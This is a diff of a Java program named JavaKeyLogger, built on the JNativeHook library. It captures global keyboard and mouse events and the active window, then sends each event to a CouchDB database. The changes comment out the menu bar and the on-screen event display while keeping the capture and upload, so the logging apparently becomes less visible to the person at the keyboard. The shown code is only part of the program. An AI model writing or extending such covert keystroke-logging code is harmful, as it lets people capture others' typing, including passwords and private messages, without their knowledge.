@@ -1,34 +1,5 @@
 package javakeylogger;
 
-import org.jnativehook.GlobalScreen;
-
-
-import org.jnativehook.NativeHookException;
-import org.jnativehook.NativeInputEvent;
-import org.jnativehook.dispatcher.SwingDispatchService;
-import org.jnativehook.keyboard.NativeKeyEvent;
-import org.jnativehook.keyboard.NativeKeyListener;
-import org.jnativehook.mouse.NativeMouseEvent;
-import org.jnativehook.mouse.NativeMouseInputListener;
-import org.jnativehook.mouse.NativeMouseWheelEvent;
-import org.jnativehook.mouse.NativeMouseWheelListener;
-import org.lightcouch.Changes;
-import org.lightcouch.ChangesResult;
-import org.lightcouch.CouchDbClient;
-import org.lightcouch.ReplicationResult;
-import org.lightcouch.Response;
-
-import javax.swing.JCheckBoxMenuItem;
-import javax.swing.JFrame;
-import javax.swing.JMenu;
-import javax.swing.JMenuBar;
-import javax.swing.JMenuItem;
-import javax.swing.JScrollPane;
-import javax.swing.JTextArea;
-import javax.swing.KeyStroke;
-import javax.swing.SwingUtilities;
-import javax.swing.WindowConstants;
-import javax.swing.text.BadLocationException;
 import java.awt.BorderLayout;
 import java.awt.Color;
 import java.awt.Dimension;
@@ -40,26 +11,6 @@ import java.awt.event.ItemListener;
 import java.awt.event.KeyEvent;
 import java.awt.event.WindowEvent;
 import java.awt.event.WindowListener;
-import java.io.PrintWriter;
-import java.io.StringWriter;
-import java.util.Date;
-import java.util.logging.ConsoleHandler;
-import java.util.logging.Formatter;
-import java.util.logging.Level;
-import java.util.logging.LogRecord;
-import java.util.logging.Logger;
-
-import java.sql.Timestamp;
-import java.util.*;
-
-
-import java.sql.Connection;
-import java.sql.DriverManager;
-import java.sql.ResultSet;
-import java.sql.SQLException;
-import java.sql.Statement;
-import java.util.Timer;
-import java.util.TimerTask;
 
 /**
  * A demonstration of how to use the JNativeHook library.
@@ -74,8 +25,42 @@ import java.util.TimerTask;
  */
 
 import java.io.BufferedReader;
-import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.io.PrintWriter;
+import java.io.StringWriter;
+import java.sql.Timestamp;
+import java.util.Date;
+import java.util.Timer;
+import java.util.TimerTask;
+import java.util.logging.ConsoleHandler;
+import java.util.logging.Formatter;
+import java.util.logging.Level;
+import java.util.logging.LogRecord;
+import java.util.logging.Logger;
+
+import javax.swing.JCheckBoxMenuItem;
+import javax.swing.JFrame;
+import javax.swing.JMenu;
+import javax.swing.JMenuBar;
+import javax.swing.JMenuItem;
+import javax.swing.JScrollPane;
+import javax.swing.JTextArea;
+import javax.swing.KeyStroke;
+import javax.swing.SwingUtilities;
+import javax.swing.WindowConstants;
+
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
+import org.jnativehook.NativeInputEvent;
+import org.jnativehook.dispatcher.SwingDispatchService;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
+import org.jnativehook.mouse.NativeMouseEvent;
+import org.jnativehook.mouse.NativeMouseInputListener;
+import org.jnativehook.mouse.NativeMouseWheelEvent;
+import org.jnativehook.mouse.NativeMouseWheelListener;
+import org.lightcouch.CouchDbClient;
+import org.lightcouch.Response;
 
 class LetsCallCouch {
 	private CouchDbClient dbClient;
@@ -97,6 +82,7 @@ class ObjectForCouch {
 	String eventData;
 	long timeStamp;
 	String activeWindow;
+	
 
 	public ObjectForCouch(String eData, long tStamp, String cOutput) {
 		eventData = eData;
@@ -146,7 +132,6 @@ class Task extends TimerTask {
 
 	}
 
-
 }
 
 class TaskScheduling {
@@ -191,7 +176,7 @@ public class JavaKeyLogger extends JFrame implements ActionListener, ItemListene
 
 		JMenuBar menuBar = new JMenuBar();
 
-		// Create the file menu.
+//		// Create the file menu.
 		JMenu menuFile = new JMenu("File");
 		menuFile.setMnemonic(KeyEvent.VK_F);
 		menuBar.add(menuFile);
@@ -201,8 +186,8 @@ public class JavaKeyLogger extends JFrame implements ActionListener, ItemListene
 		menuItemQuit.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_F4, ActionEvent.ALT_MASK));
 		menuItemQuit.getAccessibleContext().setAccessibleDescription("Exit the program");
 		menuFile.add(menuItemQuit);
-
-		// Create the view.
+//
+//		// Create the view.
 		JMenu menuView = new JMenu("View");
 		menuView.setMnemonic(KeyEvent.VK_V);
 		menuBar.add(menuView);
@@ -220,8 +205,8 @@ public class JavaKeyLogger extends JFrame implements ActionListener, ItemListene
 		menuItemEnable.setMnemonic(KeyEvent.VK_H);
 		menuItemEnable.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_H, ActionEvent.CTRL_MASK + ActionEvent.SHIFT_MASK));
 		menuView.add(menuItemEnable);
-
-		// Create the listeners sub menu.
+//
+//		// Create the listeners sub menu.
 		menuSubListeners = new JMenu("Listeners");
 		menuSubListeners.setMnemonic(KeyEvent.VK_L);
 		menuView.add(menuSubListeners);
@@ -250,7 +235,7 @@ public class JavaKeyLogger extends JFrame implements ActionListener, ItemListene
 		menuItemWheelEvents.setAccelerator(KeyStroke.getKeyStroke(KeyEvent.VK_W, ActionEvent.CTRL_MASK + ActionEvent.SHIFT_MASK));
 		menuSubListeners.add(menuItemWheelEvents);
 
-		setJMenuBar(menuBar);
+		//setJMenuBar(menuBar);
 
 		// Create feedback area.
 		txtEventInfo = new JTextArea();
@@ -269,6 +254,7 @@ public class JavaKeyLogger extends JFrame implements ActionListener, ItemListene
 		logger.setLevel(Level.ALL);
 
 		// Add our custom formatter to a console handler.
+		//
 		ConsoleHandler handler = new ConsoleHandler();
 		handler.setFormatter(new LogFormatter());
 		handler.setLevel(Level.WARNING);
@@ -437,29 +423,25 @@ public class JavaKeyLogger extends JFrame implements ActionListener, ItemListene
 		Timestamp ts = new Timestamp(time);
 		long t = ts.getTime();
 
-		txtEventInfo.append("\nTimestamp: "+ t + ",  "+ e.paramString() );
+		//txtEventInfo.append("\nTimestamp: "+ t + ",  "+ e.paramString() );
 
 		String cmdOutput = new Task().returnString();
 		//System.out.println(cmdOutput);
 
-		System.out.println("classpath:" + System.getProperty("java.class.path")); 
-
-
-
 		ObjectForCouch o4c = new ObjectForCouch(e.paramString(), t, cmdOutput);
 		letsCallCouch.dataToCouch(o4c);
 
-		try {
-			//Clean up the history to reduce memory consumption.
-			if (txtEventInfo.getLineCount() > 100) {
-				txtEventInfo.replaceRange("", 0, txtEventInfo.getLineEndOffset(txtEventInfo.getLineCount() - 1 - 100));
-			}
-
-			txtEventInfo.setCaretPosition(txtEventInfo.getLineStartOffset(txtEventInfo.getLineCount() - 1));
-		}
-		catch (BadLocationException ex) {
-			txtEventInfo.setCaretPosition(txtEventInfo.getDocument().getLength());
-		}
+//		try {
+//			//Clean up the history to reduce memory consumption.
+//			if (txtEventInfo.getLineCount() > 100) {
+//				txtEventInfo.replaceRange("", 0, txtEventInfo.getLineEndOffset(txtEventInfo.getLineCount() - 1 - 100));
+//			}
+//
+//			txtEventInfo.setCaretPosition(txtEventInfo.getLineStartOffset(txtEventInfo.getLineCount() - 1));
+//		}
+//		catch (BadLocationException ex) {
+//			txtEventInfo.setCaretPosition(txtEventInfo.getDocument().getLength());
+//		}
 	}
 
 	/**
@@ -511,20 +493,20 @@ public class JavaKeyLogger extends JFrame implements ActionListener, ItemListene
 		menuItemEnable.setSelected(true);
 
 		// Please note that these properties are not available until after the GlobalScreen class is initialized.
-		txtEventInfo.append("JNativeHook Version " + System.getProperty("jnativehook.lib.version"));
-		txtEventInfo.append("\nAuto Repeat Rate: " + System.getProperty("jnativehook.key.repeat.rate"));
-		txtEventInfo.append("\n" + "Auto Repeat Delay: " + System.getProperty("jnativehook.key.repeat.delay"));
-		txtEventInfo.append("\n" + "Double Click Time: " + System.getProperty("jnativehook.button.multiclick.iterval"));
-		txtEventInfo.append("\n" + "Pointer Sensitivity: " + System.getProperty("jnativehook.pointer.sensitivity"));
-		txtEventInfo.append("\n" + "Pointer Acceleration Multiplier: " + System.getProperty("jnativehook.pointer.acceleration.multiplier"));
-		txtEventInfo.append("\n" + "Pointer Acceleration Threshold: " + System.getProperty("jnativehook.pointer.acceleration.threshold"));
-
-		try {
-			txtEventInfo.setCaretPosition(txtEventInfo.getLineStartOffset(txtEventInfo.getLineCount() - 1));
-		}
-		catch (BadLocationException ex) {
-			txtEventInfo.setCaretPosition(txtEventInfo.getDocument().getLength());
-		}
+//		txtEventInfo.append("JNativeHook Version " + System.getProperty("jnativehook.lib.version"));
+//		txtEventInfo.append("\nAuto Repeat Rate: " + System.getProperty("jnativehook.key.repeat.rate"));
+//		txtEventInfo.append("\n" + "Auto Repeat Delay: " + System.getProperty("jnativehook.key.repeat.delay"));
+//		txtEventInfo.append("\n" + "Double Click Time: " + System.getProperty("jnativehook.button.multiclick.iterval"));
+//		txtEventInfo.append("\n" + "Pointer Sensitivity: " + System.getProperty("jnativehook.pointer.sensitivity"));
+//		txtEventInfo.append("\n" + "Pointer Acceleration Multiplier: " + System.getProperty("jnativehook.pointer.acceleration.multiplier"));
+//		txtEventInfo.append("\n" + "Pointer Acceleration Threshold: " + System.getProperty("jnativehook.pointer.acceleration.threshold"));
+//
+//		try {
+//			txtEventInfo.setCaretPosition(txtEventInfo.getLineStartOffset(txtEventInfo.getLineCount() - 1));
+//		}
+//		catch (BadLocationException ex) {
+//			txtEventInfo.setCaretPosition(txtEventInfo.getDocument().getLength());
+//		}
 
 		// Enable all of the listeners.
 		menuItemKeyboardEvents.setSelected(true);
@@ -584,11 +566,11 @@ public class JavaKeyLogger extends JFrame implements ActionListener, ItemListene
 		});
 	}
 
-	/**
-	 * A simple log formatter.
-	 *
-	 * @see java.util.Formatter
-	 */
+//	/**
+//	 * A simple log formatter.
+//	 *
+//	 * @see java.util.Formatter
+//	 */
 	private final class LogFormatter extends Formatter {
 		@Override
 		public String format(LogRecord record) {
